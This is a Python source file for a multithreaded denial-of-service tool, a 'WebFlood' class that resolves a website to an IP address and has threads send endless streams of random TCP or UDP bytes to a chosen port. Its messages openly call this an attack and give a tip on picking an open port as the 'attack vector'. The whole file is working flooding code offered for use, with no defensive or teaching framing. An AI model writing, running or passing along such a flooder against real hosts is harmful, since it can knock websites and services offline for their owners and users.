from random import _urandom
from concurrent.futures import ThreadPoolExecutor
import socket
from utils import colored_txt

class WebFlood(object):
	def __init__(self, hostname, port, requestbytesize, protocall_type) -> None:
		try:
			ip = socket.gethostbyname(hostname.replace("https://", "").replace("http://", "").replace("www.", "").replace("/", "")) # Normie URL to IP address
		except socket.gaierror:
			print(colored_txt(227, 25, 79, '[ERR] Invalid web URL'))
			exit()
		self.ip = ip
		self.port = int(port)
		self.bytesize = int(requestbytesize)
		if protocall_type.lower() not in ['tcp', 'udp']:
			print(colored_txt(227, 25, 79, '[ERR] Invalid protocall'))
			exit()
		self.protocall_type = protocall_type.lower()
		return

	def _attack(self, thread_id) -> None:
		bytestosend = _urandom(self.bytesize)
		while True:
			if self.protocall_type == 'tcp':
				Sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Spawn a raw TCP socket.
			elif self.protocall_type == 'udp':
				Sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # Spawn a raw UDP socket.
			Sock.connect((self.ip, self.port))
			Sock.sendall(bytestosend)
			if socket.error: # Close the socket if any errors are raised.
				Sock.close()
				del Sock # Just making sure.... 
			print(colored_txt(3, 252, 123, f"Sent packet to {self.ip}:{self.port} using thread #{thread_id}"))
			continue
		return # This will never be executed, but i like putting return statements in my functions.


	def attack(self, attack_func, threads: int) -> None:
		print(f"Attacking {self.ip} on port {self.port}\n - TIP: make sure the port is open before using it as an attack vector.")
		with ThreadPoolExecutor() as exe:
			result = [exe.submit(attack_func, i) for i in range(threads)]
